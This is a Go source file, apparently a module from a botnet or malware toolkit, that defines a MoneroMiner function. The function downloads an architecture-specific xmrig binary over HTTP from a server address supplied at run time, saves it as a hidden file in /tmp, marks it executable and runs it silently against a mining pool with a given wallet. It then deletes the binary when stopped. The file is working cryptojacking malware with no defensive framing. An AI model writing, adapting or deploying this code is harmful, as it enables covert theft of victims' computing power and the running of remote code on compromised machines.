package methods

import (
	"context"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

func MoneroMiner(ctx context.Context, serverIP, wallet, pool string) {
	binName := xmrigBin()
	binPath := "/tmp/." + binName

	if _, err := os.Stat(binPath); os.IsNotExist(err) {
		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Get("http://" + serverIP + ":80/" + binName)
		if err != nil {
			return
		}
		defer resp.Body.Close()
		if resp.StatusCode != 200 {
			return
		}
		f, err := os.Create(binPath)
		if err != nil {
			return
		}
		n, err := io.Copy(f, resp.Body)
		f.Close()
		if err != nil || n == 0 {
			os.Remove(binPath)
			return
		}
		os.Chmod(binPath, 0755)
	}

	cmd := exec.Command(binPath, "-o", "stratum+tcp://"+pool, "-u", wallet, "-k", "--donate-level", "0", "--no-color", "--syslog")
	cmd.Stdout = nil
	cmd.Stderr = nil
	if err := cmd.Start(); err != nil {
		return
	}

	<-ctx.Done()
	if cmd.Process != nil {
		cmd.Process.Kill()
		cmd.Process.Wait()
	}
	os.Remove(binPath)
}

func xmrigBin() string {
	switch runtime.GOARCH {
	case "amd64":
		return "xmrig-x64"
	case "386":
		return "xmrig-x86"
	case "arm64":
		return "xmrig-aarch64"
	case "arm":
		return "xmrig-arm"
	case "mips":
		return "xmrig-mips"
	case "mipsle":
		return "xmrig-mipsel"
	case "ppc64":
		return "xmrig-ppc64"
	}
	return "xmrig-x64"
}
